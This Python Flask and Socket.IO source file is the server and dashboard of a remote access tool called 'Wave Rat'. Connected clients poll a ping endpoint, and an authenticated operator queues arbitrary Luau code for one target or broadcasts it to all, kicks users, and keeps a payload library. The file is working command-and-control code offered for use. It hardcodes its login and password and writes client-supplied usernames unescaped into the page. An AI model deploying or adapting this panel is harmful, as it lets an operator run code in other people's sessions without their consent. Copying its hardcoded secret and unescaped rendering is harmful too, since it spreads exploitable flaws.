from flask import Flask, request, jsonify, render_template_string, redirect, url_for, make_response, session
from flask_socketio import SocketIO
import time
import eventlet
from datetime import datetime
import json
import os
import secrets

eventlet.monkey_patch()

app = Flask(__name__)
app.config["SECRET_KEY"] = secrets.token_hex(32)
app.config["SESSION_COOKIE_HTTPONLY"] = True
app.config["SESSION_COOKIE_SAMESITE"] = "Lax"

socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet", logger=True, engineio_logger=True)

# ==================== CONFIGURATION ====================
LOGIN = "entrepreneur1337"
PASSWORD = "A9f!Q3r#Zx7L"
SESSION_DURATION = 24 * 3600
HISTORY_FILE = "history_log.json"
PAYLOADS_FILE = "payloads.json"
STATS_FILE = "stats.json"

connected_players = {}
pending_kicks = {}
pending_commands = {}
history_log = []
payloads = {}
peak_players = 0
total_executions = 0

# ==================== PERSISTENCE ====================
def load_history():
    global history_log
    if os.path.exists(HISTORY_FILE):
        try:
            with open(HISTORY_FILE, 'r', encoding='utf-8') as f:
                history_log = json.load(f)
        except: history_log = []

def load_payloads():
    global payloads
    if os.path.exists(PAYLOADS_FILE):
        try:
            with open(PAYLOADS_FILE, 'r', encoding='utf-8') as f:
                payloads = json.load(f)
        except: payloads = {}

def load_stats():
    global peak_players, total_executions
    if os.path.exists(STATS_FILE):
        try:
            with open(STATS_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
                peak_players = data.get("peak_players", 0)
                total_executions = data.get("total_executions", 0)
        except: pass

def save_stats():
    with open(STATS_FILE, 'w', encoding='utf-8') as f:
        json.dump({"peak_players": peak_players, "total_executions": total_executions}, f)

def save_payloads():
    with open(PAYLOADS_FILE, 'w', encoding='utf-8') as f:
        json.dump(payloads, f, indent=2)

def add_history(type_action, username, details):
    entry = {
        "time": datetime.now().strftime("%H:%M:%S"),
        "type": type_action,
        "username": username,
        "details": details
    }
    history_log.insert(0, entry)
    if len(history_log) > 50: history_log.pop()
    socketio.emit("history_update", {"history": history_log})

load_history()
load_payloads()
load_stats()

# ==================== AUTH ====================
def is_authenticated():
    return session.get("authenticated") is True and session.get("expires", 0) > time.time()

def require_auth(f):
    def wrapper(*args, **kwargs):
        if not is_authenticated(): return redirect(url_for("login_page"))
        return f(*args, **kwargs)
    wrapper.__name__ = f.__name__
    return wrapper

# ==================== HTML TEMPLATES ====================

LOGIN_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Wave Rat | Login</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Space+Mono&display=swap');
        body { background: #000; color: #06b6d4; font-family: 'Space Mono', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: #0a0a0a; border: 1px solid #1a1a1a; padding: 40px; border-radius: 8px; width: 300px; text-align: center; }
        input { width: 100%; padding: 10px; margin: 10px 0; background: #000; border: 1px solid #1a1a1a; color: #fff; box-sizing: border-box; }
        button { width: 100%; padding: 10px; background: #06b6d4; border: none; color: #000; font-weight: bold; cursor: pointer; }
        .error { color: #ff0055; font-size: 0.8em; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2 style="letter-spacing: 4px;">WAVE RAT</h2>
        <form method="POST">
            <input type="text" name="login" placeholder="Username" required autofocus>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">ENTER SYSTEM</button>
        </form>
        {% if error %}<p class="error">{{ error }}</p>{% endif %}
    </div>
</body>
</html>
"""

MAIN_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Wave Rat | Dashboard</title>
    <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Inter:wght@400;600&display=swap');
        :root {
            --primary: #06b6d4; --bg-primary: #000000; --bg-secondary: #0a0a0a;
            --bg-card: #121212; --border: #1a1a1a; --text: #ffffff; --text-dim: #808080;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Inter', sans-serif; background: var(--bg-primary); color: var(--text); overflow-x: hidden; }
        
        .container { max-width: 1300px; margin: 0 auto; padding: 20px; }
        
        header { display: flex; justify-content: space-between; align-items: center; padding: 20px 0; border-bottom: 1px solid var(--border); margin-bottom: 30px; }
        .logo { font-family: 'Space Mono', monospace; font-size: 1.5rem; color: var(--primary); font-weight: bold; letter-spacing: 2px; }

        .stats-bar { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; margin-bottom: 30px; }
        .stat-card { background: var(--bg-card); border: 1px solid var(--border); padding: 20px; border-radius: 8px; text-align: center; }
        .stat-val { display: block; font-family: 'Space Mono', monospace; font-size: 1.8rem; color: var(--primary); }
        .stat-label { font-size: 0.7rem; color: var(--text-dim); text-transform: uppercase; }

        .section-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
        .btn { padding: 8px 16px; font-family: 'Space Mono', monospace; font-size: 0.8rem; border-radius: 4px; cursor: pointer; transition: 0.2s; border: 1px solid var(--border); background: transparent; color: var(--text); }
        .btn-primary { background: var(--primary); color: #000; border: none; font-weight: bold; }
        .btn:hover { opacity: 0.8; }
        .btn-danger { color: #ff0055; border-color: #ff0055; }

        .player-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 20px; }
        .player-card { background: var(--bg-card); border: 1px solid var(--border); padding: 20px; border-radius: 12px; position: relative; }
        .status-dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; margin-right: 5px; }
        .online { background: var(--primary); box-shadow: 0 0 10px var(--primary); }
        .offline { background: #444; }

        .history-panel { background: var(--bg-secondary); border: 1px solid var(--border); border-radius: 8px; margin-top: 40px; max-height: 300px; overflow-y: auto; }
        .history-row { padding: 10px 20px; border-bottom: 1px solid #151515; font-size: 0.85rem; display: flex; gap: 15px; }
        .history-time { color: var(--text-dim); font-family: 'Space Mono', monospace; }

        /* MODAL */
        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.8); z-index: 100; align-items: center; justify-content: center; }
        .modal-content { background: var(--bg-card); border: 1px solid var(--primary); padding: 30px; width: 500px; border-radius: 10px; }
        textarea { width: 100%; background: #000; border: 1px solid var(--border); color: #00ff41; padding: 10px; font-family: 'Space Mono', monospace; margin-top: 10px; resize: vertical; }
        select { width: 100%; padding: 10px; background: #000; color: white; border: 1px solid var(--border); margin-bottom: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <div class="logo">WAVE_RAT//GUI</div>
            <button class="btn btn-danger" onclick="location.href='/logout'">DISCONNECT</button>
        </header>

        <div class="stats-bar">
            <div class="stat-card"><span class="stat-label">Active Users</span><span class="stat-val" id="stat-online">0</span></div>
            <div class="stat-card"><span class="stat-label">Peak Concurrent</span><span class="stat-val" id="stat-peak">0</span></div>
            <div class="stat-card"><span class="stat-label">Total Executions</span><span class="stat-val" id="stat-total">0</span></div>
        </div>

        <div class="section-header">
            <h3 style="font-family: 'Space Mono';">CONNECTED_CLIENTS</h3>
            <div style="display:flex; gap: 10px;">
                <button class="btn" onclick="openPayloads()">PAYLOADS</button>
                <button class="btn btn-primary" onclick="openCommand('ALL')">BROADCAST</button>
            </div>
        </div>

        <div id="player-grid" class="player-grid"></div>

        <div class="section-header" style="margin-top:40px;">
            <h3 style="font-family: 'Space Mono';">SYSTEM_LOGS</h3>
        </div>
        <div id="history-log" class="history-panel"></div>
    </div>

    <div id="modal-cmd" class="modal">
        <div class="modal-content">
            <h4 id="cmd-title" style="margin-bottom:15px; font-family:'Space Mono'; color:var(--primary);">EXECUTE_REMOTE</h4>
            <select id="payload-select" onchange="loadSelectedPayload()">
                <option value="">-- Choose a payload --</option>
            </select>
            <textarea id="cmd-text" rows="10" placeholder="-- Enter Luau Code --"></textarea>
            <div style="display:flex; gap:10px; margin-top:15px;">
                <button class="btn" style="flex:1" onclick="closeModal('modal-cmd')">CANCEL</button>
                <button class="btn btn-primary" style="flex:1" onclick="submitCommand()">EXECUTE</button>
            </div>
        </div>
    </div>

    <script>
        const socket = io();
        let currentTarget = null;
        let payloadsList = {};

        socket.on('update', (data) => {
            document.getElementById('stat-online').innerText = data.online;
            document.getElementById('stat-peak').innerText = data.peak;
            document.getElementById('stat-total').innerText = data.total_exec;
            renderPlayers(data.players);
        });

        socket.on('history_update', (data) => {
            const container = document.getElementById('history-log');
            container.innerHTML = data.history.map(h => `
                <div class="history-row">
                    <span class="history-time">[${h.time}]</span>
                    <span style="color:var(--primary)">${h.username}</span>
                    <span style="color:var(--text-dim)">${h.type}: ${h.details}</span>
                </div>
            `).join('');
        });

        function renderPlayers(players) {
            const grid = document.getElementById('player-grid');
            grid.innerHTML = Object.entries(players).map(([uid, p]) => `
                <div class="player-card">
                    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;">
                        <span style="font-weight:bold;">${p.username}</span>
                        <span><span class="status-dot ${p.online ? 'online' : 'offline'}"></span><small style="font-size:0.6rem; color:var(--text-dim)">${p.online ? 'LIVE' : 'IDLE'}</small></span>
                    </div>
                    <div style="font-size:0.7rem; color:var(--text-dim); margin-bottom:20px;">UUID: ${uid}</div>
                    <div style="display:flex; gap:10px;">
                        <button class="btn btn-primary" style="flex:1" onclick="openCommand('${uid}')">SCRIPT</button>
                        <button class="btn btn-danger" onclick="kickPlayer('${uid}')">KICK</button>
                    </div>
                </div>
            `).join('');
        }

        async function fetchPayloads() {
            const r = await fetch('/get_payloads');
            payloadsList = await r.json();
            const select = document.getElementById('payload-select');
            select.innerHTML = '<option value="">-- Custom Script --</option>' + 
                Object.keys(payloadsList).map(name => `<option value="${name}">${name}</option>`).join('');
        }

        function loadSelectedPayload() {
            const name = document.getElementById('payload-select').value;
            document.getElementById('cmd-text').value = payloadsList[name] || "";
        }

        function openCommand(uid) {
            currentTarget = uid;
            document.getElementById('cmd-title').innerText = uid === 'ALL' ? 'BROADCAST_ALL' : 'TARGET: ' + uid;
            document.getElementById('modal-cmd').style.display = 'flex';
            fetchPayloads();
        }

        function closeModal(id) { document.getElementById(id).style.display = 'none'; }

        async function submitCommand() {
            const code = document.getElementById('cmd-text').value;
            await fetch('/command', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ uid: currentTarget, command: code })
            });
            closeModal('modal-cmd');
        }

        async function kickPlayer(uid) {
            if(confirm("Voulez-vous kick cet utilisateur ?")) {
                await fetch('/kick', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ uid: uid })
                });
            }
        }

        function openPayloads() {
            const name = prompt("Nom du nouveau payload :");
            if(!name) return;
            const code = prompt("Code Luau :");
            fetch('/manage_payloads', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ action: 'add', name, code })
            });
        }
    </script>
</body>
</html>
"""

# ==================== ROUTES FLASK ====================

@app.route("/login", methods=["GET", "POST"])
def login_page():
    if is_authenticated(): return redirect(url_for("index"))
    if request.method == "POST":
        if request.form.get("login") == LOGIN and request.form.get("password") == PASSWORD:
            session["authenticated"] = True
            session["expires"] = time.time() + SESSION_DURATION
            return redirect(url_for("index"))
        return render_template_string(LOGIN_HTML, error="Invalid Access Key")
    return render_template_string(LOGIN_HTML)

@app.route("/")
@require_auth
def index():
    return render_template_string(MAIN_HTML)

@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("login_page"))

# ==================== API ENDPOINTS ====================

@app.route("/ping", methods=["POST"])
def ping():
    data = request.json
    uid = data.get("uid")
    username = data.get("username", "Unknown")
    if not uid: return "Missing UID", 400
    
    if uid not in connected_players:
        add_history("connection", username, "New user connected")
        
    connected_players[uid] = {
        "username": username,
        "last": time.time(),
        "online": True
    }
    
    response = {}
    if uid in pending_kicks:
        response["kick"] = pending_kicks.pop(uid)
    if uid in pending_commands:
        response["command"] = pending_commands.pop(uid)
    
    return jsonify(response)

@app.route("/command", methods=["POST"])
@require_auth
def send_command():
    global total_executions
    data = request.json
    uid = data.get("uid")
    cmd = data.get("command")
    
    if uid == "ALL":
        for p_uid in connected_players:
            pending_commands[p_uid] = cmd
        add_history("broadcast", "System", "Broadcast sent to all")
    else:
        pending_commands[uid] = cmd
        name = connected_players.get(uid, {}).get("username", "Unknown")
        add_history("command", name, "Custom script sent")
    
    total_executions += 1
    save_stats()
    return jsonify({"status": "ok"})

@app.route("/kick", methods=["POST"])
@require_auth
def kick_player():
    data = request.json
    uid = data.get("uid")
    pending_kicks[uid] = "You have been kicked by an administrator."
    name = connected_players.get(uid, {}).get("username", "Unknown")
    add_history("kick", name, "Administrator action")
    return jsonify({"status": "ok"})

@app.route("/get_payloads")
@require_auth
def get_payloads():
    return jsonify(payloads)

@app.route("/manage_payloads", methods=["POST"])
@require_auth
def manage_payloads():
    data = request.json
    action = data.get("action")
    if action == "add":
        payloads[data["name"]] = data["code"]
    elif action == "delete":
        payloads.pop(data.get("name"), None)
    save_payloads()
    return jsonify({"ok": True})

# ==================== BACKGROUND TASK ====================

def broadcast_loop():
    global peak_players
    while True:
        now = time.time()
        online_count = 0
        for uid, p in list(connected_players.items()):
            # Timeout après 30s d'inactivité
            if now - p["last"] > 30:
                p["online"] = False
            if p["online"]:
                online_count += 1
        
        if online_count > peak_players:
            peak_players = online_count
            save_stats()
            
        socketio.emit("update", {
            "players": connected_players,
            "online": online_count,
            "peak": peak_players,
            "total_exec": total_executions
        })
        eventlet.sleep(2)

if __name__ == "__main__":
    eventlet.spawn(broadcast_loop)
    socketio.run(app, host="0.0.0.0", port=5000)
